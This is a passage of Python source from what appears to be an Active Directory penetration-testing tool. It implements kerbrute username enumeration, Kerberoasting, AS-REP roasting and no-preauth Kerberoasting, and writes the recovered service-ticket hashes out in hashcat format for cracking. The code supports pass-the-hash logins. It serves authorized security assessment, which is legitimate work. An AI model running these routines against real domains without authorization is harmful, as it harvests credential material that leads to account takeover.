            wordlist: Path to the username wordlist.
            kerbrute_path: Full path to the ``kerbrute`` binary.
            output_file: Path where kerbrute should write its log/output.
            executor: Optional command executor, mainly for testing and as the
                blocking fail-safe fallback when ``spawn`` is unavailable.
            spawn: Optional ``shell.spawn_command``-shaped callable. When
                provided, kerbrute's stdout is STREAMED so the live "found N"
                counter advances during the run (the reliable source --
                kerbrute buffers its ``-o`` file). Threaded in by the CLI.
            scan_id: Optional scan identifier for progress emission.
            timeout: Command timeout in seconds.
            auth_mode: Authentication mode for the @requires_auth gate. This
                operation needs no credential, so it defaults to
                ``UNAUTHENTICATED``; callers on the unauth path pass it
                explicitly to suppress the decorator's "assuming authenticated"
                debug line.
            cancellation: Optional cooperative-cancellation token (see
                ``adscan_internal.services.cooperative_cancellation``). On a
                large wordlist this run can take minutes to hours; when the
                operator (Ctrl+C) or the platform ("Stop" sentinel) requests
                an early stop mid-run, the kerbrute process is stopped and
                the usernames found BEFORE the stop are returned -- the scan
                continues with that partial list rather than aborting. Kept
                ``None`` by default so existing callers are unaffected; only
                the CLI's main wordlist-driven entry point wires a token.

        Returns:
            List of unique usernames (lowercase) discovered.
        """

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_user_enumeration",
            progress=0.0,
            message=f"Enumerating users via Kerberos on {domain}",
        )

        # Build kerbrute command. ``-v`` makes kerbrute log ONE line per
        # ATTEMPTED username (valid AND invalid) -- empirically confirmed
        # against lab.local @ 10.99.0.1 (kerbrute v1.0.3). Counting those lines
        # drives a DETERMINATE ``tested / N`` progress bar (N = userlist size)
        # instead of an opaque "found N" spinner. The downstream username parse
        # is ``VALID USERNAME``-anchored (see _parse_userenum_output_lines), so
        # the invalid lines ``-v`` adds to BOTH stdout and the ``-o`` file are
        # ignored for credential capture and never mis-reported as valid.
        # ``--threads`` -- Go default is 10 (~11 candidates/sec observed).
        # KERBRUTE_THREADS is a 5x bump, still RTT-bound against a single DC
        # (see the SSOT throughput/ETA block above this method's class).
        cmd = (
            f"{shlex.quote(kerbrute_path)} userenum -v "
            f"--threads {KERBRUTE_THREADS} "
            f"-d {shlex.quote(domain)} "
            f"--dc {shlex.quote(pdc)} "
            f"{shlex.quote(wordlist)} "
            f"-o {shlex.quote(str(output_file))}"
        )

        exec_fn = executor or _default_executor

        self.logger.info(
            "Executing Kerberos user enumeration",
            extra={"domain": domain, "pdc": pdc},
        )

        # Upfront patience notice -- threshold-gated on the wordlist size.
        # Silent for small lists; a single line under non-interactive runs.
        try:
            candidate_count = sum(
                1
                for _ in open(wordlist, encoding="utf-8", errors="ignore")
            )
        except OSError:
            candidate_count = 0

        # Expand the subprocess timeout to cover the projected run (hard-cap
        # ~6h), flooring at the caller's own timeout so small-wordlist callers
        # (the 180s/300s CN-inference and format-inference validation paths)
        # are unaffected. Without this, an opted-in full statistically-likely
        # run would be killed at the caller's flat 300s long before it could
        # finish.
        effective_timeout = estimate_kerbrute_subprocess_timeout_seconds(
            candidate_count, floor_seconds=timeout
        )

        try:
            maybe_show_patience_notice(
                PatienceNoticeConfig(
                    operation="Kerberos user enumeration",
                    unit="candidate usernames",
                    threshold=5000,
                    env_var="ADSCAN_PATIENCE_THRESHOLD_USERENUM",
                ),
                count=candidate_count,
                non_interactive=is_non_interactive(),
                rate_per_second=estimate_kerbrute_throughput_per_sec(),
            )
        except Exception:  # noqa: BLE001 -- notice must never abort the scan
            pass

        def _count_found() -> int:
            """Count VALID-USERNAME lines kerbrute streams into the -o file.

            ``VALID USERNAME``-anchored: with ``-v`` the ``-o`` file also holds
            ``[!] ... - User does not exist`` lines (which contain ``@domain``),
            so a bare ``@`` test would over-count. Used only by the blocking
            fallback's "found N" poll.
            """
            try:
                return sum(
                    1
                    for line in output_file.read_text(
                        encoding="utf-8", errors="ignore"
                    ).splitlines()
                    if _KERBRUTE_VALID_USERNAME_MARKER in line
                )
            except OSError:
                return 0

        try:
            # Indeterminate live dashboard. The blocking ``exec_fn`` runs in a
            # worker thread so the spinner + "found N" tick while it blocks;
            # LiveSession falls back to inline logging on non-TTY/CI itself.
            # FAIL-SAFE: a dashboard render/update error must never abort the
            # enumeration -- the helper falls back to a direct blocking call.
            result = _run_userenum_with_dashboard(
                exec_fn,
                cmd,
                effective_timeout,
                _count_found,
                spawn=spawn,
                domain=domain,
                total=candidate_count or None,
                cancellation=cancellation,
            )
        except subprocess.TimeoutExpired as exc:
            # Recover users found before the timeout fired. kerbrute streams
            # VALID-USERNAME lines to stdout AND the -o file; on timeout we
            # union both partial sources instead of discarding everything (the
            # old behaviour falsely reported "no valid usernames").
            recovered = self._recover_partial_userenum(
                getattr(exc, "stdout", None) or getattr(exc, "output", None),
                output_file,
                domain,
            )
            self.logger.error(
                "Kerberos user enumeration timed out",
                extra={"domain": domain, "pdc": pdc, "recovered": len(recovered)},
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message=(
                    "Kerberos user enumeration timed out "
                    f"({len(recovered)} user(s) recovered before timeout)"
                    if recovered
                    else "Kerberos user enumeration timed out"
                ),
            )
            return recovered
        except Exception as exc:  # pragma: no cover - defensive
            telemetry.capture_exception(exc)
            self.logger.exception(
                "Unexpected error during Kerberos user enumeration",
                extra={"domain": domain, "pdc": pdc},
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message="Kerberos user enumeration failed",
            )
            return []

        if getattr(result, "cancelled", False):
            # The operator (Ctrl+C) or the platform ("Stop" sentinel) requested
            # an early stop mid-run. This is a STOP, never an abort -- recover
            # the usernames found before the stop the same way a timeout's
            # partial output is recovered, and let the scan continue with them.
            recovered = self._recover_partial_userenum(
                getattr(result, "stdout", None),
                output_file,
                domain,
            )
            self.logger.info(
                "Kerberos user enumeration stopped early by operator/platform",
                extra={"domain": domain, "pdc": pdc, "recovered": len(recovered)},
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message=(
                    "Kerberos user enumeration stopped early "
                    f"({len(recovered)} user(s) found before stopping)"
                    if recovered
                    else "Kerberos user enumeration stopped early (no users found yet)"
                ),
            )
            return recovered

        if result.returncode != 0:
            # A non-zero exit can still follow a partially populated -o file
            # (kerbrute found valid users, then died). Recover them from
            # stdout + the -o file rather than discarding everything.
            recovered = self._recover_partial_userenum(
                getattr(result, "stdout", None),
                output_file,
                domain,
            )
            self.logger.warning(
                "Kerberos user enumeration command failed",
                extra={
                    "domain": domain,
                    "pdc": pdc,
                    "returncode": result.returncode,
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                    "recovered": len(recovered),
                },
            )
            self.parent._emit_progress(
                scan_id=scan_id,
                phase="kerberos_user_enumeration",
                progress=1.0,
                message=(
                    "Kerberos user enumeration failed "
                    f"({len(recovered)} user(s) recovered)"
                    if recovered
                    else "Kerberos user enumeration failed"
                ),
            )
            return recovered

        # Parse discovered usernames. The kerbrute ``-o`` file is the on-disk
        # record and stays authoritative, but we UNION it with the process
        # stdout (which the streaming path captured live) via the shared
        # recovery helper. When both agree the result is identical to parsing
        # the file alone; the union only adds robustness when one source is
        # missing or partial (e.g. a buffered ``-o`` file that never flushed a
        # late hit before exit). Reads are fully defensive.
        usernames = self._recover_partial_userenum(
            getattr(result, "stdout", None),
            output_file,
            domain,
        )

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberos_user_enumeration",
            progress=1.0,
            message=f"Kerberos user enumeration completed: {len(usernames)} user(s) found",
        )
        self.logger.info(
            "Kerberos user enumeration completed",
            extra={"domain": domain, "count": len(usernames)},
        )
        return usernames

    @requires_auth(AuthMode.AUTHENTICATED)
    def kerberoast(
        self,
        domain: str,
        pdc: str,
        username: str,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        *,
        auth_domain: Optional[str] = None,
        usersfile: Optional[Path] = None,
        workspace_dir: str = "",
        domains_data: dict | None = None,
        sync_clock: Callable[[str], Any] | None = None,
        output_file: Optional[Path] = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,  # noqa: ARG002 — kept for back-compat; native path manages its own timeouts.
    ) -> List[KerberoastHash]:
        """Perform Kerberoasting natively via kerbad (no impacket scripts).

        Workflow (single code path, same-domain and cross-realm):
            1. Enumerate SPN-bearing users over LDAP (LDAPS preferred, Kerberos auth).
            2. Build a ``KerberosConfig`` from the supplied credential.
            3. Use ``kerberos_transport.kerberoast_users`` to obtain TGS material
               in hashcat ``$krb5tgs$`` format.

        Args:
            domain: Target domain (where SPNs live).
            pdc: Primary Domain Controller for ``domain``.
            username: sAMAccountName of the authenticating user.
            password: Plaintext password (mutually optional with ``hashes``).
            hashes: NTLM hashes (LM:NT or NT) for pass-the-hash auth.
            auth_domain: Domain the credential belongs to.  Defaults to ``domain``.
            usersfile: Optional list narrowing the SPN target set.
            workspace_dir: Workspace root directory for environment preparation.
            domains_data: Per-domain configuration mapping.
            sync_clock: Optional hook to sync clock with the PDC.
            output_file: Optional file where hashcat lines are written.
            scan_id: Optional scan identifier for progress emission.
            timeout: Legacy parameter, ignored.

        Returns:
            List of :class:`KerberoastHash` entries (hashcat ``$krb5tgs$`` lines).

        Raises:
            ValueError: If neither password nor hashes provided.
        """
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting",
            progress=0.0,
            message=f"Starting Kerberoasting attack on {domain}",
        )

        if not password and not hashes:
            raise ValueError(
                "Either password or hashes must be provided for Kerberoasting"
            )

        normalized_auth_domain = str(auth_domain or domain).strip() or domain
        cross_realm = normalized_auth_domain.lower() != domain.lower()

        marked_domain = mark_sensitive(domain, "domain")
        marked_user = mark_sensitive(username, "user")
        marked_pdc = mark_sensitive(str(pdc), "ip")

        cross_realm_note = " · cross-realm" if cross_realm else ""
        print_info_verbose(
            f"Kerberoast · KDC {marked_pdc} · "
            f"{marked_user}@{mark_sensitive(normalized_auth_domain, 'domain')} · "
            f"{_format_auth_mode(password, hashes)}{cross_realm_note}"
        )

        self.logger.info(
            "Executing Kerberoasting attack",
            extra={
                "domain": domain,
                "pdc": pdc,
                "username": username,
                "has_password": bool(password),
                "has_hashes": bool(hashes),
                "cross_realm": cross_realm,
                "engine": "kerbad_native",
            },
        )

        hashes_list = self._kerberoast_via_ldap(
            domain=domain,
            pdc=pdc,
            username=username,
            password=password,
            hashes=hashes,
            auth_domain=normalized_auth_domain,
            output_file=output_file,
            workspace_dir=workspace_dir,
            domains_data=domains_data,
            sync_clock=sync_clock,
        )

        self.logger.info(
            "Kerberoasting completed: %s hash(es) extracted",
            len(hashes_list),
            extra={
                "domain": domain,
                "auth_domain": normalized_auth_domain,
                "count": len(hashes_list),
                "engine": "kerbad_native",
            },
        )

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting",
            progress=1.0,
            message=f"Kerberoasting completed: {len(hashes_list)} hash(es) found",
        )

        if hashes_list:
            print_success(
                f"Recovered {len(hashes_list)} service ticket hash(es) for {marked_domain}."
            )
        else:
            print_warning(f"No Kerberoast hashes recovered for {marked_domain}.")

        return hashes_list

    def _kerberoast_via_ldap(
        self,
        *,
        domain: str,
        pdc: str,
        username: str,
        password: Optional[str],
        hashes: Optional[str],
        auth_domain: str,
        output_file: Optional[Path],
        workspace_dir: str = "",
        domains_data: dict | None = None,
        sync_clock: Callable[[str], Any] | None = None,
    ) -> List[KerberoastHash]:
        """Enumerate roastable users via LDAP and request TGS tickets via kerbad.

        Phase 1 (LDAP enumeration) uses ADscanLDAPConnection.
        Phase 2 (TGT + TGS-REQ per SPN) calls
        ``kerberos_transport.kerberoast_users``.

        Same-domain and cross-realm flows share this code path; the
        ``cross_domain`` flag inside kerbad is selected automatically based
        on ``auth_domain`` vs ``domain``.

        AES-only environments are handled by the kerbad transport's
        ETYPE-INFO2 salt probe; ``etypes=[18, 17, 23]`` is offered when only
        a password is available so AES is preferred when supported.
        """
        domains_data_obj: object = domains_data or {}
        workspace_root = str(workspace_dir or "").strip()
        sync_clock_fn = sync_clock

        kerberos_ready = self._prepare_roasting_kerberos_environment(
            operation_name="kerberoast",
            target_domain=domain,
            workspace_dir=workspace_root,
            username=username,
            user_domain=auth_domain,
            credential=password or hashes,
            dc_ip=pdc,
            domains_data=domains_data_obj,
            sync_clock=sync_clock_fn,
        )
        if not kerberos_ready:
            return []

        domains_data = domains_data_obj if isinstance(domains_data_obj, dict) else {}
        domain_data = (
            domains_data.get(domain, {}) if isinstance(domains_data, dict) else {}
        )
        endpoints = resolve_ldap_target_endpoints(
            target_domain=domain,
            domain_data={**domain_data, "pdc": pdc or domain_data.get("pdc")},
            kerberos_ready=True,
        )
        dc_address = str(pdc or endpoints.dc_address or "").strip()
        if not dc_address:
            return []

        print_info("Enumerating SPN-bearing users via LDAP...")

        search_filter = "(&(servicePrincipalName=*)(!(objectCategory=computer)))"
        attributes = [
            "sAMAccountName",
            "userAccountControl",
            "memberOf",
            "pwdLastSet",
            "lastLogon",
            "objectClass",
        ]

        def _collect(connection: Any) -> list[dict[str, object]]:
            search_base = ",".join(
                f"DC={label}" for label in str(domain).split(".") if label.strip()
            )
            connection.search(
                search_base=search_base,
                search_filter=search_filter,
                attributes=attributes,
                search_scope="SUBTREE",
                paged_size=1000,
            )
            if not isinstance(connection.entries, list):
                print_info_debug(
                    "[kerberoast] LDAP enumeration returned no entries object "
                    f"(type={type(connection.entries).__name__}) for "
                    f"{mark_sensitive(str(domain), 'domain')}"
                )
                return []

            raw_entry_count = len(connection.entries)
            collected: list[dict[str, object]] = []
            for entry in connection.entries:
                raw_mapping = entry.entry_attributes_as_dict
                mapping = raw_mapping if isinstance(raw_mapping, dict) else {}
                user_account_control = int(
                    self._first_attribute_value(mapping, "userAccountControl") or 0
                )
                if user_account_control & _UF_ACCOUNTDISABLE:
                    continue
                sam = str(
                    self._first_attribute_value(mapping, "sAMAccountName") or ""
                ).strip()
                if not sam:
                    continue
                collected.append(
                    {
                        "sAMAccountName": sam,
                        "objectClass": [
                            str(value).strip().lower()
                            for value in self._attribute_values(mapping, "objectClass")
                            if str(value).strip()
                        ],
                    }
                )
            # Raw vs filtered counts disambiguate an intermittent "0 SPN users":
            # 0 raw on a completed search => no SPN-bearing account (or the
            # search raced); raw>0 collected=0 => all hits disabled / sAM-less.
            print_info_debug(
                "[kerberoast] LDAP SPN enumeration for "
                f"{mark_sensitive(str(domain), 'domain')}: "
                f"raw_entries={raw_entry_count} candidates={len(collected)}"
            )
            return collected

        auth_domain_data = (
            domains_data.get(auth_domain, {}) if isinstance(domains_data, dict) else {}
        )
        auth_kdc = str(auth_domain_data.get("pdc") or "").strip() or None
        try:
            entries, _used_ldaps = execute_with_ldap_fallback(
                operation_name="kerberoast",
                target_domain=domain,
                dc_address=dc_address,
                callback=_collect,
                username=username,
                password=password,
                use_kerberos=True,
                prefer_ldaps=True,
                kerberos_target_hostname=endpoints.kerberos_target_hostname,
                allow_password_fallback_on_kerberos_failure=False,
                auth_domain=auth_domain,
                auth_kdc=auth_kdc,
            )
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"LDAP enumeration failed while preparing Kerberoast on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []
        if not entries:
            print_warning("No SPN-bearing users found in directory.")
            return []

        target_usernames: list[str] = []
        for entry in entries:
            sam = str(entry.get("sAMAccountName") or "").strip()
            if sam:
                target_usernames.append(sam)

        if not target_usernames:
            print_warning("No usable SPN-bearing usernames after filtering.")
            return []

        print_info_verbose(
            f"Requesting service tickets for {len(target_usernames)} user(s)..."
        )

        # Build KerberosConfig.  Priority: NT hash > password.
        nt_hash: Optional[str] = None
        if hashes:
            hash_text = str(hashes).strip()
            if ":" in hash_text:
                _, nt_hash = hash_text.split(":", 1)
            else:
                nt_hash = hash_text

        krb_config = KerberosConfig(
            domain=auth_domain,
            kdc_ip=pdc,  # target domain KDC (for TGS-REQ referral target)
            username=username,
            password=password if not nt_hash else None,
            nt_hash=nt_hash or None,
            etypes=[18, 17, 23] if (not nt_hash) else None,
            auth_kdc_ip=auth_kdc,
        )

        try:
            roast_results = run_async_sync(
                kerberoast_users(
                    krb_config,
                    target_usernames,
                    target_domain=domain,
                )
            )
        except KerberosClockSkewError as exc:
            telemetry.capture_exception(exc)
            print_error(
                "Clock skew too large between this host and the KDC. "
                "Synchronise the clock and retry."
            )
            return []
        except KerberosTransportError as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"Kerberos transport error during Kerberoasting on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []
        except Exception as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"Unexpected error during Kerberoasting on "
                f"{mark_sensitive(domain, 'domain')}."
            )
            return []

        lines_to_write: list[str] = []
        hashes_list: list[KerberoastHash] = []
        table_rows: list[tuple[str, str, str, str]] = []
        revoked_count = 0
        other_skip_count = 0
        no_hash_count = 0
        for sam, hash_line, err in roast_results:
            user_display = mark_sensitive(sam, "user")
            if err is not None and not hash_line:
                err_text = str(err)
                low = err_text.lower()
                if "revoked" in low or "kdc_err_client_revoked" in low:
                    revoked_count += 1
                    table_rows.append(
                        (
                            user_display,
                            "[dim]disabled[/dim]",
                            "—",
                            "account disabled or locked",
                        )
                    )
                else:
                    other_skip_count += 1
                    print_info_verbose(f"[skip] {user_display}: {err_text}")
                    table_rows.append(
                        (user_display, "[yellow]skipped[/yellow]", "—", err_text[:80])
                    )
                continue
            if not hash_line:
                no_hash_count += 1
                table_rows.append(
                    (
                        user_display,
                        "[yellow]no hash[/yellow]",
                        "—",
                        "no TGS material returned",
                    )
                )
                continue
            hashes_list.append(KerberoastHash(username=sam, hash_value=hash_line))
            lines_to_write.append(hash_line)
            etype_label = _extract_etype(hash_line)
            styled = _styled_etype(etype_label)
            print_success(f"  └─ {user_display}  ({styled})  →  hashcat-ready")
            table_rows.append(
                (
                    user_display,
                    "[green]hash[/green]",
                    etype_label,
                    "service ticket retrieved",
                )
            )

        # Only materialize the hashfile when there is at least one hash. A
        # zero-hash roast must NOT create a 0-byte file: downstream cracking
        # guards on file presence, and an empty hashfile makes hashcat exit
        # with "hashfile is empty or corrupt" (RC 255).
        self._write_hash_lines(output_file, lines_to_write)

        skipped_total = revoked_count + other_skip_count + no_hash_count
        if skipped_total and not is_verbose_mode():
            parts: list[str] = []
            if revoked_count:
                parts.append(f"{revoked_count} disabled/revoked")
            if no_hash_count:
                parts.append(f"{no_hash_count} no TGS")
            if other_skip_count:
                parts.append(f"{other_skip_count} other")
            print_info(
                f"  [dim]{skipped_total} users skipped: "
                f"{' · '.join(parts)}  (run with --verbose for full table)[/dim]"
            )
        elif is_verbose_mode():
            _render_roast_summary(title="Kerberoast Results", rows=table_rows)
        _render_etype_advisory(
            [k for h in lines_to_write if (k := _extract_etype_key(h))],
            roast_type="kerberoast",
        )

        print_info_debug(
            "[kerberoast] Native kerbad path: "
            f"target_domain={mark_sensitive(domain, 'domain')} "
            f"auth_domain={mark_sensitive(auth_domain, 'domain')} "
            f"entries={len(entries)} hashes={len(hashes_list)}"
        )
        return hashes_list

    # Backwards-compatible alias for the previous private name.
    _kerberoast_cross_domain_via_ldap = _kerberoast_via_ldap

    @staticmethod
    def _attribute_values(
        mapping: dict[object, object], attribute: str
    ) -> list[object]:
        """Return one attribute as a stable list from an ldap3 mapping."""
        for key, value in mapping.items():
            if str(key).casefold() != str(attribute).casefold():
                continue
            if isinstance(value, (list, tuple, set)):
                return list(value)
            return [value]
        return []

    @classmethod
    def _first_attribute_value(
        cls, mapping: dict[object, object], attribute: str
    ) -> object | None:
        """Return the first value for one attribute from an ldap3 mapping."""
        values = cls._attribute_values(mapping, attribute)
        return values[0] if values else None

    def asreproast(
        self,
        domain: str,
        pdc: str,
        *,
        username: Optional[str] = None,
        password: Optional[str] = None,
        hashes: Optional[str] = None,
        auth_domain: Optional[str] = None,
        usersfile: Optional[Path] = None,
        workspace_dir: str = "",
        domains_data: dict | None = None,
        sync_clock: Callable[[str], Any] | None = None,
        output_file: Optional[Path] = None,
        scan_id: Optional[str] = None,
        timeout: int = 300,  # noqa: ARG002 — kept for back-compat; native path manages its own timeouts.
    ) -> List[ASREPHash]:
        """Perform AS-REP Roasting natively via kerbad (no impacket scripts).

        Two modes:
            * Authenticated — LDAP-enumerated users with ``DONT_REQUIRE_PREAUTH``.
            * Unauthenticated — usernames from a wordlist file.

        Args:
            domain: Target domain.
            pdc: Primary Domain Controller for ``domain``.
            username: sAMAccountName for authenticated mode (optional).
            password: Plaintext password for authenticated mode (optional).
            hashes: NTLM hashes for authenticated mode (optional).
            auth_domain: Domain the credential belongs to.  Defaults to ``domain``.
            usersfile: User wordlist (required for unauthenticated mode).
            workspace_dir: Workspace root directory for environment preparation.
            domains_data: Per-domain configuration mapping.
            sync_clock: Optional hook to sync clock with the PDC.
            output_file: Optional file where hashcat lines are written.
            scan_id: Optional scan identifier for progress emission.
            timeout: Legacy parameter, ignored.

        Returns:
            List of :class:`ASREPHash` entries (hashcat ``$krb5asrep$`` lines).

        Raises:
            ValueError: If neither credentials nor usersfile provided.
        """
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="asreproasting",
            progress=0.0,
            message=f"Starting AS-REP Roasting attack on {domain}",
        )

        is_authenticated = bool(username and password)
        is_unauthenticated = bool(usersfile)

        if not is_authenticated and not is_unauthenticated:
            raise ValueError(
                "Either credentials (username + password) or usersfile must be provided for AS-REP Roasting"
            )

        normalized_auth_domain = str(auth_domain or domain).strip() or domain
        marked_domain = mark_sensitive(domain, "domain")
        marked_pdc = mark_sensitive(str(pdc), "ip")
        mode_label = (
            "authenticated · LDAP candidates"
            if is_authenticated
            else "unauthenticated · wordlist"
        )
        print_info_verbose(
            f"AS-REP Roast · KDC {marked_pdc} · {mode_label}"
        )

        self.logger.info(
            "Executing AS-REP Roasting attack",
            extra={
                "domain": domain,
                "pdc": pdc,
                "mode": "authenticated" if is_authenticated else "unauthenticated",
                "has_usersfile": is_unauthenticated,
                "engine": "kerbad_native",
            },
        )

        if is_authenticated:
            print_info_verbose("Sending AS-REQ without preauth for each candidate...")
            hashes_list = self._asreproast_authenticated_via_ldap(
                domain=domain,
                pdc=pdc,
                username=str(username or ""),
                password=password,
                hashes=hashes,
                auth_domain=normalized_auth_domain,
                output_file=output_file,
                workspace_dir=workspace_dir,
                domains_data=domains_data,
                sync_clock=sync_clock,
            )
        else:
            print_info_verbose("Sending AS-REQ without preauth from wordlist...")
            hashes_list = self._asreproast_from_usersfile(
                domain=domain,
                pdc=pdc,
                usersfile=usersfile,
                output_file=output_file,
            )

        self.logger.info(
            f"AS-REP Roasting completed: {len(hashes_list)} hash(es) extracted",
            extra={"domain": domain, "count": len(hashes_list)},
        )

        self.parent._emit_progress(
            scan_id=scan_id,
            phase="asreproasting",
            progress=1.0,
            message=f"AS-REP Roasting completed: {len(hashes_list)} hash(es) found",
        )

        if hashes_list:
            print_success(
                f"Recovered {len(hashes_list)} AS-REP hash(es) for {marked_domain}."
            )
        else:
            print_warning(f"No AS-REP hashes recovered for {marked_domain}.")

        return hashes_list

    @requires_auth(AuthMode.UNAUTHENTICATED)
    def kerberoast_no_preauth(
        self,
        domain: str,
        pdc: str,
        *,
        no_preauth_username: str,
        usersfile: Path,
        output_file: Optional[Path] = None,
        scan_id: Optional[str] = None,
    ) -> List[KerberoastHash]:
        """Request TGS material using a no-preauth account as the primitive.

        Uses kerbad to obtain a TGT (with nopreauth credential type) then
        requests TGS tickets for each target username.
        """
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting_no_preauth",
            progress=0.0,
            message=f"Starting no-preauth Kerberoast attack on {domain}",
        )

        target_lines = self._read_target_lines(usersfile)
        hashes_list: list[KerberoastHash] = []
        lines_to_write: list[str] = []

        filtered = [
            t for t in target_lines if t.lower() != "krbtgt" and not t.endswith("$")
        ]

        if filtered:
            try:
                krb_config = KerberosConfig(
                    domain=domain,
                    kdc_ip=pdc,
                    username=no_preauth_username,
                    password="",  # empty password triggers nopreauth in some kerbad builds
                )
                roast_results = run_async_sync(kerberoast_users(krb_config, filtered))
                for sam, hash_line, err in roast_results:
                    if err is not None or not hash_line:
                        continue
                    hashes_list.append(
                        KerberoastHash(username=sam, hash_value=hash_line)
                    )
                    lines_to_write.append(hash_line)
            except KerberosTransportError as exc:
                telemetry.capture_exception(exc)
                self.logger.error(
                    "kerbad no-preauth kerberoast failed",
                    extra={"domain": domain},
                )
            except Exception as exc:
                telemetry.capture_exception(exc)
                self.logger.exception(
                    "Unexpected error in no-preauth kerberoast",
                    extra={"domain": domain},
                )

        self._write_hash_lines(output_file, lines_to_write)
        self.parent._emit_progress(
            scan_id=scan_id,
            phase="kerberoasting_no_preauth",
            progress=1.0,
            message=f"No-preauth Kerberoast completed: {len(hashes_list)} hash(es) found",
        )
        return hashes_list

    def _prepare_roasting_kerberos_environment(
        self,
        *,
        operation_name: str,
        target_domain: str,
        workspace_dir: str,
        username: str,
        user_domain: str,
        credential: Optional[str],
        dc_ip: str,
        domains_data: object,
        sync_clock: Optional[Callable[[str], bool]],
    ) -> bool:
        """Prepare Kerberos workspace state for one native roasting operation."""
        return prepare_kerberos_ldap_environment(
            operation_name=operation_name,
            target_domain=target_domain,
            workspace_dir=workspace_dir,
            username=username,
            user_domain=user_domain,
            credential=credential,
            dc_ip=dc_ip,
            domains_data=domains_data,
            sync_clock=sync_clock,
        )

    def _write_hash_lines(
        self, output_file: Optional[Path], lines_to_write: list[str]
    ) -> None:
        """Write one hash per line when an output file is requested.

        A zero-hash roast must NOT create a 0-byte file: downstream cracking
        guards on file presence, and an empty hashfile makes hashcat exit with
        "hashfile is empty or corrupt" (RC 255). When there are no hashes we
        write nothing, so the absent file signals "no hashes" to the caller.
        """
        if output_file is None:
            return
        if not lines_to_write:
            return
        output_file.parent.mkdir(parents=True, exist_ok=True)
        output_file.write_text(
            "".join(f"{line}\n" for line in lines_to_write),
            encoding="utf-8",
        )

    def _read_target_lines(self, usersfile: Optional[Path]) -> list[str]:
        """Read a plain text target file into normalized non-empty entries."""
        if usersfile is None or not usersfile.exists():
            return []
        try:
            content = usersfile.read_text(encoding="utf-8", errors="ignore")
        except OSError as exc:
            telemetry.capture_exception(exc)
            self.logger.exception("Failed to read roasting targets from users file")
            return []
        return [line.strip() for line in content.splitlines() if line.strip()]

    def _asreproast_authenticated_via_ldap(
        self,
        *,
        domain: str,
        pdc: str,
        username: str,
        password: Optional[str],
        hashes: Optional[str],
        auth_domain: str,
        output_file: Optional[Path],
        workspace_dir: str = "",
        domains_data: dict | None = None,
        sync_clock: Callable[[str], Any] | None = None,
    ) -> List[ASREPHash]:
        """Enumerate UF_DONT_REQUIRE_PREAUTH users over LDAP and request AS-REPs via kerbad."""
        domains_data_obj: object = domains_data or {}
        workspace_root = str(workspace_dir or "").strip()
        sync_clock_fn = sync_clock

        kerberos_ready = self._prepare_roasting_kerberos_environment(
            operation_name="authenticated asreproast",
            target_domain=domain,
            workspace_dir=workspace_root,
            username=username,
            user_domain=auth_domain,
            credential=password or hashes,
            dc_ip=pdc,
            domains_data=domains_data_obj,
            sync_clock=sync_clock_fn,
        )
        if not kerberos_ready:
            return []

        domains_data = domains_data_obj if isinstance(domains_data_obj, dict) else {}
        domain_data = (
            domains_data.get(domain, {}) if isinstance(domains_data, dict) else {}
        )
        endpoints = resolve_ldap_target_endpoints(
            target_domain=domain,
            domain_data={**domain_data, "pdc": pdc or domain_data.get("pdc")},
            kerberos_ready=True,
        )
        dc_address = str(pdc or endpoints.dc_address or "").strip()
        if not dc_address:
            return []

        search_filter = (
            f"(&(UserAccountControl:1.2.840.113556.1.4.803:={_UF_DONT_REQUIRE_PREAUTH})"
            f"(!(UserAccountControl:1.2.840.113556.1.4.803:={_UF_ACCOUNTDISABLE}))"
            "(!(objectCategory=computer)))"
        )

        def _collect(connection: Any) -> list[str]:
            search_base = ",".join(
                f"DC={label}" for label in str(domain).split(".") if label.strip()
            )
            connection.search(
                search_base=search_base,
                search_filter=search_filter,
                attributes=["sAMAccountName"],
                search_scope="SUBTREE",
                paged_size=1000,
            )
            if not isinstance(connection.entries, list):
                # Search did not yield a list of entries — distinct from an
                # empty result. Logged so an intermittent "0 candidates" can be
                # told apart from a genuinely empty directory next time.
                print_info_debug(
                    "[asreproast] LDAP enumeration returned no entries object "
                    f"(type={type(connection.entries).__name__}) for "
                    f"{mark_sensitive(str(domain), 'domain')}"
                )
                return []
            raw_entry_count = len(connection.entries)
            usernames: list[str] = []
            for entry in connection.entries:
                raw_mapping = entry.entry_attributes_as_dict
                mapping = raw_mapping if isinstance(raw_mapping, dict) else {}
                sam = str(
                    self._first_attribute_value(mapping, "sAMAccountName") or ""
                ).strip()
                if sam:
                    usernames.append(sam)
            # Raw vs filtered counts disambiguate the "0 AS-REP candidates"
            # outcomes: 0 raw on a completed search => directory has no
            # DONT_REQ_PREAUTH account (or the search raced); raw>0 filtered to
            # 0 => every hit lacked sAMAccountName.
            print_info_debug(
                "[asreproast] LDAP DONT_REQ_PREAUTH enumeration for "
                f"{mark_sensitive(str(domain), 'domain')}: "
                f"raw_entries={raw_entry_count} candidates={len(usernames)}"
            )
            return usernames

        candidates, _used_ldaps = execute_with_ldap_fallback(
            operation_name="authenticated asreproast",
            target_domain=domain,
            dc_address=dc_address,
            callback=_collect,
            username=username,
            password=password,
            use_kerberos=True,
            prefer_ldaps=True,
            kerberos_target_hostname=endpoints.kerberos_target_hostname,
            allow_password_fallback_on_kerberos_failure=False,
        )
        if not candidates:
            return []
        return self._collect_asrep_hashes_for_users(
            domain=domain,
            pdc=pdc,
            usernames=candidates,
            output_file=output_file,
        )

    def _asreproast_from_usersfile(
        self,
        *,
        domain: str,
        pdc: str,
        usersfile: Optional[Path],
